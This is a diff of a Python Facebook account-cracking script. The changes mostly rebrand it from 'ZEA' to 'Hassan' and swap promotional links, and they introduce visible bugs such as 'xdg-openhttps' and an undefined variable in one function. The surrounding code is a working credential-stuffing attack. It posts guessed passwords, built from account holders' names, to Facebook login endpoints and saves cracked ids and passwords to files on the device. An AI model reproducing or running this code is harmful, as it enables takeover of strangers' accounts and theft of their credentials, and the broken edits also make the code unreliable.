@@ -16,7 +16,7 @@ print('\33[1;32m  join my facebook groph')
 
 
 
-os.system('xdg-open https://www.facebook.com/groups/569978438358911/')
+os.system('xdg-openhttps://m.facebook.com/groups/4619616058120223//')
 
 from os import path
 import os,base64,zlib,pip,urllib
@@ -170,22 +170,20 @@ for agent in range(10000):
         
         
 logo=("""\033[1;32m
- /$$$$$$$$ /$$$$$$$$  /$$$$$$ 
-|_____ $$ | $$_____/ /$$__  $$
-     /$$/ | $$      | $$  \ $$
-    /$$/  | $$$$$   | $$$$$$$$
-   /$$/   | $$__/   | $$__  $$
-  /$$/    | $$      | $$  | $$
- /$$$$$$$$| $$$$$$$$| $$  | $$
-|________/|________/|__/  |__/ 
+.##..##...####....####....####....####...##..##.
+.##..##..##..##..##......##......##..##..###.##.
+.######..######...####....####...######..##.###.
+.##..##..##..##......##......##..##..##..##..##.
+.##..##..##..##...####....####...##..##..##..##.
+................................................ 
 033[1;32m+=========================================================+
-|   Owner        :   Sabir Sahil
-|   Facebook     :   Sabir Sahil
-|   Telegram     :  @Sabir Sahil
-|   Tools        :     Paid
-|   Versino      :     1.1.4
+|   Owner        :   Hassan Karimi 
+|   Facebook     :   HASSAN
+|   Telegram     :  @Hassan Karimi
+|   Facebookgroup:  Hassan_tech 
+|   Versino      :     1.1.5
 +=========================================================+""")
-os.system('xdg-open https://www.youtube.com/@zea.sabir107')
+os.system('xdg-openhttps://www.facebook.com/profile.php?id=100070283389809 ')
 def linex():
         print('\033[1;32m----------------------------------------------')
 def clear():
@@ -199,7 +197,7 @@ id=[]
 tokenku=[]
 def zea1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;32m [ZEA-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;32m [Hassan-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -216,18 +214,18 @@ def zea1(ids,names,passlist):
                         getlog = session.get('https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        ZEA=session.cookies.get_dict().keys()
-                        if "c_user" in ZEA:
+                        Hassan=session.cookies.get_dict().keys()
+                        if "c_user" in Hassan:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [ZEA-OK] %s • %s'%(ids,pas))
-                                open('/sdcard/ZEA-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
+                                print('\r\r\033[1;32m [Hassan-OK] %s • %s'%(ids,pas))
+                                open('/sdcard/Hassan-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in ZEA:
+                        elif 'checkpoint' in Hassan:
                                 if 'y' in pcp:
-                                        print#('\r\r\x1b[38;5;208m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ZEA-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print#('\r\r\x1b[38;5;208m [Hassan-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Hassan-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -239,7 +237,7 @@ def zea1(ids,names,passlist):
         loop+=1
 def zea2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;32m [ZEA-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;32m [Hassan-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -257,23 +255,22 @@ def zea2(ids,names,passlist):
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         ZEA=session.cookies.get_dict().keys()
-                        if "c_user" in ZEA:
+                        if "c_user" in Hassan:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [ZEA-OK] %s • %s'%(ids,pas))
-                                open('/sdcard/ZEA-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
+                                print('\r\r\033[1;32m [Hassan-OK] %s • %s'%(ids,pas))
+                                open('/sdcard/Hassan-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in ZEA:
+                        elif 'checkpoint' in Hassan:
                                 if 'y' in pcp:
-                                        print#('\r\r\x1b[38;5;208m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ZEA-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print#('\r\r\x1b[38;5;208m [Hassan-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Hassan-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
                                         break
-                        else:
-                                continue
+                        else:                               continue
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
         loop+=2
@@ -327,10 +324,10 @@ def zeast():
             yaari.submit(rcrack,uid,pwx,tl)
     linex()
     print(' Crack process has been completed')
-    print(' Ids saved in ZEA-OK.txt,in cp ZEA-CP.txt')
+    print(' Ids saved in Hassan-OK.txt,in cp Z-CP.txt')
     linex()
     input(' Press Enter to Back')    
-    os.system('python ZEA.py')
+    os.system('python Hassan10.py')
 
   
 def rcrack(uid,pwx,tl):
@@ -378,21 +375,21 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[ZEA-OK] '+uid+' • '+ps+'\033[0;97m')
-                open('/sdcard/ZEA-OK.txt', 'a').write(cid+' • '+ps+'\n')
+                print('\033[1;32m[Hassan-OK] '+uid+' • '+ps+'\033[0;97m')
+                open('/sdcard/Hassan-OK.txt', 'a').write(cid+' • '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
-                print('\033[1;31m[ZEA-CP] '+uid+' • '+ps+'\033[0;97m')
-                open('/sdcard/ZEA-CP.txt', 'a').write(cid+' • '+ps+'\n')
+                print('\033[1;31m[Hassan-CP] '+uid+' • '+ps+'\033[0;97m')
+                open('/sdcard/Hassan-CP.txt', 'a').write(cid+' • '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r[ZEA] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
+        sys.stdout.write('\r[Hassan] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
